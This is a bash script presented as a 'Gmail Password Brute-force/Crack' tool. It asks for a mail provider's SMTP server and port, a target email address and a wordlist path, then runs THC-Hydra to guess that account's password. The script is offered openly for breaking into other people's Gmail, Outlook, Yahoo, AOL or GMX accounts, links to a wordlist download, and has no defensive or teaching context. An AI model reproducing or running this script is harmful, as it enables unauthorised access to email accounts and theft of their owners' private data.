#! /bin/bash

bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`
 
clear

echo "${normal}▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓        ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███"  
echo '▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒'
echo '▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒'
echo '▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░       ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄ ' 
echo '░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒'
echo '░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░'
echo '░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░     ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░'
echo   ' ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ '
echo   ' ░  ░       ░         ░  ░ ░      ░  ░   ░ ░         ░           ░  ░░ ░      ░  ░      ░  ░   ░ '    
                                           
echo Gmail Password Brute-force/Crack
echo Written By: Ghosty/DeaDHackS
echo IMPORTANT: Make sure you have a good/big wordlist and that you have THC-Hydra installed!
echo If you need a wordlist go on this link: https://mega.nz/#!kfRR3JDT!t2HLQ44tgSqi_3dldfU3A4Gl467ROHuWPTe5aoccOcE
echo Dont forget to check out my channel!: https://www.youtube.com/channel/UC2r5Hvlthtpr55-L_zTb6Uw
echo =================================================
echo Lets setup the attack first...
echo Choose what e-mail service you wanna to hack?
echo Choose by name:
echo [1]. 'smtp.gmail.com(Gmail)'
echo [2]. 'smtp.live.com(Outlook/Hotmail)'
echo [3]. 'smtp.mail.yahoo.com(Yahoo)'
echo [4]. 'smtp.aol.com(AOL)'
echo [5]. 'mail.gmx.com(GMX)'
read smtp
echo Setting up smtp..............DONE!
echo Smtp = $smtp
echo ==================================================
echo DO NOT PUT ANY CUSTOM PORT NUMBER OTHERWISE WE WONT BE ABLE TO CONNECT TO THE RIGHT SMTP!
echo Chosse by port number:
echo [1]. '465(Gmail)'
echo [2]. '587(Outlook/Hotmail)'
echo [3]. '465(Yahoo)'
echo [4]. '587(AOL)'
echo [5]. '587(GMX)'
read port
echo Setting up port.....DONE!
echo Port = $port
echo ==================================================
echo Enter Target Email Address:
read email
echo Setting up email...DONE!
echo Email = $email
echo ==================================================
echo Path To Wordlist:
read wordlist
echo Setting up wordlist.......DONE!
echo Wordlist Path = $wordlist
echo ==================================================
echo Launching Hydra with all infos that your provided!
echo Thanks for using our script!
echo ==================================================
echo Load it, let it blow!

hydra -S -l $email -P $wordlist -e ns -V -s $port $smtp smtp
